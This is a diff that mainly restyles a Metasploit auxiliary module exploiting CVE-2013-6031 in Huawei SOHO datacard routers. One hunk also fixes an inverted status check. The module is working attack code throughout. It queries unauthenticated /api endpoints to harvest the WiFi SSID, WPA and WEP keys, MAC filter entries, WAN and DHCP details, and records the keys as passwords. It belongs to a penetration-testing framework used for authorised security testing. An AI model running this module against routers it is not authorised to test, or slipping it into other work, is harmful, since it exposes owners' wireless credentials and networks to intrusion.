@@ -13,80 +13,77 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-                      'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
-                      'Description'    => %q{
-          This module exploits an un-authenticated information disclosure vulnerability in Huawei
+      'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
+      'Description'    => %q{
+        This module exploits an un-authenticated information disclosure vulnerability in Huawei
         SOHO routers. The module will gather information by accessing the /api pages where
         authentication is not required, allowing configuration changes
         as well as information disclosure including any stored SMS.
       },
-                      'License'        => MSF_LICENSE,
-                      'Author'         =>
-                          [
-                              'Jimson K James.',
-                              'tomsmaily[at]aczire.com',  #Msf module
-                          ],
-                      'References'     =>
-                          [
-                              [ 'CWE', '425' ],
-                              [ 'CVE', '2013-6031' ],
-                              [ 'US-CERT-VU', '341526' ],
-                              [ 'URL', 'http://www.huaweidevice.co.in/Support/Downloads/' ],
-                          ],
-                      'DisclosureDate' => "Nov 11 2013" ))
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Jimson K James.',
+          'tomsmaily[at]aczire.com',  #Msf module
+        ],
+      'References'     =>
+        [
+          ['CWE', '425'],
+          ['CVE', '2013-6031'],
+          ['US-CERT-VU', '341526'],
+          ['URL', 'http://www.huaweidevice.co.in/Support/Downloads/'],
+        ],
+      'DisclosureDate' => "Nov 11 2013" ))
 
     register_options(
-        [
-            Opt::RHOST("mobilewifi.home")
-        ], self.class)
+      [
+        Opt::RHOST('mobilewifi.home')
+      ], self.class)
 
   end
 
+  #Gather basic router information
   def run
-
-    #Gather basic router information
     get_router_info
-    print_status("")
+    print_status('')
     get_router_mac_filter_info
-    print_status("")
+    print_status('')
     get_router_wan_info
-    print_status("")
+    print_status('')
     get_router_dhcp_info
-    print_status("")
+    print_status('')
     get_wifi_info
-    print_status("")
-
-    #end run
+    print_status('')
   end
 
   def get_wifi_info
 
-    print_status("Now trying to get WiFi Key details...")
+    print_status('Now trying to get WiFi Key details...')
     res = send_request_raw(
-        {
-            'method'  => 'GET',
-            'uri'     => '/api/wlan/security-settings',
-        })
+      {
+        'method'  => 'GET',
+        'uri'     => '/api/wlan/security-settings',
+      })
 
     #check whether we got any response from server and proceed.
-    if not res
-      print_error("Failed to get any response from server!!!")
+    unless res
+      print_error('Failed to get any response from server!!!')
       return
     end
 
     #Is it a HTTP OK
-    if (!(res.code == 200))
-      print_error("Did not get HTTP 200, URL was not found. Exiting!")
+    unless res.code == 200
+      print_error('Did not get HTTP 200, URL was not found. Exiting!')
       return
     end
 
     #Check to verify server reported is a Huawei router
-    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
-      print_error("Target doesn't seem to be a Huawei router. Exiting!")
+    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
+      print_error('Target doesn\'t seem to be a Huawei router. Exiting!')
       return
     end
 
-    print_status("---===[ WiFi Key Details ]===---")
+    print_status('---===[ WiFi Key Details ]===---')
 
     wifissid = get_router_ssid
     if wifissid
@@ -148,54 +145,49 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     credentials = {
-        "Access Point"    => rhost,
-        "SSID"    =>  wifissid,
-        "WPA Key" =>  wifiwpapsk,
-        "802.11 Auth" =>  wifiauthmode,
-        "EncryptionMode"  =>  wifiwpaencryptionmodes,
-        "WEP Key"     =>  wifiwepkey1
+      'Access Point'   => rhost,
+      'SSID'           => wifissid,
+      'WPA Key'        => wifiwpapsk,
+      '802.11 Auth'    => wifiauthmode,
+      'EncryptionMode' => wifiwpaencryptionmodes,
+      'WEP Key'        => wifiwepkey1
     }
 
     report_note(
-        :host => rhost,
-        :type => 'password',
-        :data => credentials
+      :host => rhost,
+      :type => 'password',
+      :data => credentials
     )
-
-  rescue ::Exception => e
-    print_status("Ooooops: #{e.class} #{e}")
-
-    #end run
   end
 
   def get_router_info
 
     print_status("Attempting to connect to #{rhost} to gather basic device information...")
     res = send_request_raw(
-        {
-            'method'  => 'GET',
-            'uri'     => '/api/device/information',
-        })
+      {
+        'method'  => 'GET',
+        'uri'     => '/api/device/information',
+      })
 
     #check whether we got any response from server and proceed.
     unless res
-      print_error("Failed to get any response from server!!!")
+      print_error('Failed to get any response from server!!!')
       return
     end
 
     #Is it a HTTP OK
-    unless res.code == 200
-      print_status("Okay, Got an HTTP 200 (okay) code. Verifying Server header")
+    if res.code == 200
+      print_status('Okay, Got an HTTP 200 (okay) code. Verifying Server header')
     else
-      print_error("Did not get HTTP 200, URL was not found. Exiting!")
+      print_error('Did not get HTTP 200, URL was not found. Exiting!')
       return
     end
 
     #Check to verify server reported is a Huawei router
-    if (res.headers['Server'].match(/IPWEBS\/1.4.0/i))
+    if res.headers['Server'].match(/IPWEBS\/1.4.0/i)
       print_status("Server is a Huawei router! Grabbing info\n")
     else
-      print_error("Target doesn't seem to be a Huawei router. Exiting!")
+      print_error('Target doesn\'t seem to be a Huawei router. Exiting!')
       return
     end
 
@@ -275,36 +267,32 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def get_router_ssid
-
-    #print_status("Attempting to connect to http://#{rhost}/api/device/information to get router ssid")
     res = send_request_raw(
-        {
-            'method'  => 'GET',
-            'uri'     => '/api/wlan/basic-settings',
-        })
+      {
+        'method'  => 'GET',
+        'uri'     => '/api/wlan/basic-settings',
+      })
 
     #check whether we got any response from server and proceed.
-    if not res
-      print_error("Failed to get any response from server!!!")
+    unless res
+      print_error('Failed to get any response from server!!!')
       return
     end
 
     #Is it a HTTP OK
-    if (!(res.code == 200))
-      print_error("Did not get HTTP 200, URL was not found. Exiting!")
+    unless res.code == 200
+      print_error('Did not get HTTP 200, URL was not found. Exiting!')
       return
     end
 
     #Check to verify server reported is a Huawei router
-    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
-      print_error("Target doesn't seem to be a Huawei router. Exiting!")
+    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
+      print_error('Target doesn\'t seem to be a Huawei router. Exiting!')
       return
     end
 
     # Grabbing the Wifi SSID
     if res.body.match(/<WifiSsid>(.*)<\/WifiSsid>/i)
-      ssid = $1
-      #print_status("SSID #{ssid}")
       return $1
     end
   end
@@ -312,41 +300,41 @@ class Metasploit3 < Msf::Auxiliary
   def get_router_mac_filter_info
 
     res = send_request_raw(
-        {
-            'method'  => 'GET',
-            'uri'     => '/api/wlan/mac-filter',
-        })
+      {
+        'method'  => 'GET',
+        'uri'     => '/api/wlan/mac-filter',
+      })
 
     #check whether we got any response from server and proceed.
-    if not res
-      print_error("Failed to get any response from server!!!")
+    unless res
+      print_error('Failed to get any response from server!!!')
       return
     end
 
     #Is it a HTTP OK
-    if (!(res.code == 200))
-      print_error("Did not get HTTP 200, URL was not found. Exiting!")
+    unless res.code == 200
+      print_error('Did not get HTTP 200, URL was not found. Exiting!')
       return
     end
 
     #Check to verify server reported is a Huawei router
-    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
-      print_error("Target doesn't seem to be a Huawei router. Exiting!")
+    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
+      print_error('Target doesn\'t seem to be a Huawei router. Exiting!')
       return
     end
 
-    print_status("---===[ MAC Filter Information ]===---")
+    print_status('---===[ MAC Filter Information ]===---')
 
     # Grabbing the WifiMacFilterStatus
     if res.body.match(/<WifiMacFilterStatus>(.*)<\/WifiMacFilterStatus>/i)
       wifimacfilterstatus = $1
-      print_status("Wifi MAC Filter Status: #{(wifimacfilterstatus == "1") ? "ENABLED" : "DISABLED"}" )
+      print_status("Wifi MAC Filter Status: #{(wifimacfilterstatus == '1') ? 'ENABLED' : 'DISABLED'}" )
     end
 
     # Grabbing the WifiMacFilterMac0
     if res.body.match(/<WifiMacFilterMac0>(.*)<\/WifiMacFilterMac0>/i)
       wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
+      unless wifimacfiltermac == ''
         print_status("Mac: #{wifimacfiltermac}")
       end
     end
@@ -354,63 +342,63 @@ class Metasploit3 < Msf::Auxiliary
     # Grabbing the WifiMacFilterMac1
     if res.body.match(/<WifiMacFilterMac1>(.*)<\/WifiMacFilterMac1>/i)
       wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
+      unless wifimacfiltermac == ''
         print_status("Mac: #{wifimacfiltermac}")
       end
     end
     # Grabbing the WifiMacFilterMac2
     if res.body.match(/<WifiMacFilterMac2>(.*)<\/WifiMacFilterMac2>/i)
       wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
+      unless wifimacfiltermac == ''
         print_status("Mac: #{wifimacfiltermac}")
       end
     end
     # Grabbing the WifiMacFilterMac3
     if res.body.match(/<WifiMacFilterMac3>(.*)<\/WifiMacFilterMac3>/i)
       wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
+      unless wifimacfiltermac == ''
         print_status("Mac: #{wifimacfiltermac}")
       end
     end
     # Grabbing the WifiMacFilterMac4
     if res.body.match(/<WifiMacFilterMac4>(.*)<\/WifiMacFilterMac4>/i)
       wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
+      unless wifimacfiltermac == ''
         print_status("Mac: #{wifimacfiltermac}")
       end
     end
     # Grabbing the WifiMacFilterMac5
     if res.body.match(/<WifiMacFilterMac5>(.*)<\/WifiMacFilterMac5>/i)
       wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
+      unless wifimacfiltermac == ''
         print_status("Mac: #{wifimacfiltermac}")
       end
     end
     # Grabbing the WifiMacFilterMac6
     if res.body.match(/<WifiMacFilterMac6>(.*)<\/WifiMacFilterMac6>/i)
       wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
+      unless wifimacfiltermac == ''
         print_status("Mac: #{wifimacfiltermac}")
       end
     end
     # Grabbing the WifiMacFilterMac7
     if res.body.match(/<WifiMacFilterMac7>(.*)<\/WifiMacFilterMac7>/i)
       wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
+      unless wifimacfiltermac == ''
         print_status("Mac: #{wifimacfiltermac}")
       end
     end
     # Grabbing the WifiMacFilterMac8
     if res.body.match(/<WifiMacFilterMac8>(.*)<\/WifiMacFilterMac8>/i)
       wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
+      unless wifimacfiltermac == ''
         print_status("Mac: #{wifimacfiltermac}")
       end
     end
     # Grabbing the WifiMacFilterMac9
     if res.body.match(/<WifiMacFilterMac9>(.*)<\/WifiMacFilterMac9>/i)
       wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
+      unless wifimacfiltermac == ''
         print_status("Mac: #{wifimacfiltermac}")
       end
     end
@@ -419,30 +407,30 @@ class Metasploit3 < Msf::Auxiliary
   def get_router_wan_info
 
     res = send_request_raw(
-        {
-            'method'  => 'GET',
-            'uri'     => '/api/monitoring/status',
-        })
+      {
+        'method'  => 'GET',
+        'uri'     => '/api/monitoring/status',
+      })
 
     #check whether we got any response from server and proceed.
-    if not res
-      print_error("Failed to get any response from server!!!")
+    unless res
+      print_error('Failed to get any response from server!!!')
       return
     end
 
     #Is it a HTTP OK
-    if (!(res.code == 200))
-      print_error("Did not get HTTP 200, URL was not found. Exiting!")
+    unless res.code == 200
+      print_error('Did not get HTTP 200, URL was not found. Exiting!')
       return
     end
 
     #Check to verify server reported is a Huawei router
-    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
-      print_error("Target doesn't seem to be a Huawei router. Exiting!")
+    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
+      print_error('Target doesn\'t seem to be a Huawei router. Exiting!')
       return
     end
 
-    print_status("---===[ WAN Details ]===---")
+    print_status('---===[ WAN Details ]===---')
 
     # Grabbing the WanIPAddress
     if res.body.match(/<WanIPAddress>(.*)<\/WanIPAddress>/i)
@@ -467,30 +455,30 @@ class Metasploit3 < Msf::Auxiliary
   def get_router_dhcp_info
 
     res = send_request_raw(
-        {
-            'method'  => 'GET',
-            'uri'     => '/api/dhcp/settings',
-        })
+      {
+        'method'  => 'GET',
+        'uri'     => '/api/dhcp/settings',
+      })
 
     #check whether we got any response from server and proceed.
-    if not res
-      print_error("Failed to get any response from server!!!")
+    unless res
+      print_error('Failed to get any response from server!!!')
       return
     end
 
     #Is it a HTTP OK
-    if (!(res.code == 200))
-      print_error("Did not get HTTP 200, URL was not found. Exiting!")
+    unless res.code == 200
+      print_error('Did not get HTTP 200, URL was not found. Exiting!')
       return
     end
 
     #Check to verify server reported is a Huawei router
-    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
-      print_error("Target doesn't seem to be a Huawei router. Exiting!")
+    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
+      print_error('Target doesn\'t seem to be a Huawei router. Exiting!')
       return
     end
 
-    print_status("---===[ DHCP Details ]===---")
+    print_status('---===[ DHCP Details ]===---')
 
     # Grabbing the DhcpIPAddress
     if res.body.match(/<DhcpIPAddress>(.*)<\/DhcpIPAddress>/i)
@@ -501,10 +489,10 @@ class Metasploit3 < Msf::Auxiliary
     # Grabbing the DhcpStatus
     if res.body.match(/<DhcpStatus>(.*)<\/DhcpStatus>/i)
       dhcpstatus = $1
-      print_status("DHCP: #{(dhcpstatus=="1") ? "ENABLED" : "DISABLED"}")
+      print_status("DHCP: #{(dhcpstatus=="1") ? 'ENABLED' : 'DISABLED'}")
     end
 
-    if (dhcpstatus != "1")
+    unless dhcpstatus == '1'
       return
     end
 
@@ -526,5 +514,4 @@ class Metasploit3 < Msf::Auxiliary
       print_status("DHCP Lease Time: #{dhcpleasetime}")
     end
   end
-#end module
 end
